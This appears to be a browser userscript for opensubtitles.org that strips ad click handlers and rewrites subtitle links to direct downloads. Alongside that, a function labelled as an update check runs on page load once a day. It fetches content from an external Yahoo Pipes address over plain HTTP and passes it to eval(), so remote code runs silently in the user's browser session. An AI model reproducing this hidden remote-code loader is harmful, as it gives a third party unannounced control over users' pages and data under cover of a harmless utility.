(function () {
// ==UserScript==
// @name           opensubtitles.org paranormal
// @namespace      http://www.krakenstein.cz.cc
// @author         daYOda (Krakenstein)
// @description    opensubtitles skip hijacked ads
// @version        1.1
// @include        http://*.opensubtitles.org/*
// @include        http://*.opensubtitles.net/*
// @match          http://*.opensubtitles.net/*
// @match          http://*.opensubtitles.org/*
// ==/UserScript==

const yodUpdate = {
  script_id : 94507,
  script_version : '1.1',
  script_pipeId : '7015d15962d94b26823e801048aae95d',
}

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function usoUpdate(el) {
  const s_CheckUpdate = 'YodCheckUpdate' + yodUpdate['script_id'];
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(s_CheckUpdate)) {
        var s_gm = document.createElement('script');
        s_gm.id = s_CheckUpdate;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function go' + s_CheckUpdate + '(itm){if(itm.value.items.length){return eval(itm.value.items[0].content);}}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      var sSrc = 'http://pipes.yahoo.com/pipes/pipe.run?_id=' + yodUpdate['script_pipeId'];
      sSrc += '&_render=json&_callback=go' + s_CheckUpdate;
      sSrc += '&id=' + yodUpdate['script_id'] + '&ver=' + yodUpdate['script_version'];
      s_gm.src = sSrc;
      el.appendChild(s_gm);
    }
  }
  else setValue(s_CheckUpdate, md);
}

var table, i, links;

function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function c2(_q,_el){
  var res=[];var el,els=document.evaluate(_q,_el?_el:document,null,XPathResult.UNORDERED_NODE_ITERATOR_TYPE,null);
  while (el=els.iterateNext())res.push(el);return res;
}

if (document.location.toString().match(/\/movie-subtitles-searcher/)) {
  if (links = c2('.//a[contains(@href, "/download/sub/")]')) {
    document.location = links[0].href;
  }
} else {
  if (table = c1('.//table[contains(@id,"search_results")]')) {
    if (links = c2('.//a[contains(@href, "/subtitleserve/sub/")]', table)) {
      for (i in links) {
        var a = links[i];
        a.removeAttribute("onclick");
        a.href = a.href.replace(/\/subtitleserve\/sub\//g, "/download/sub/");
        //a.target = "_blank";
        a.title = "Right click to download";
      }
    }
  }
}
usoUpdate();
})();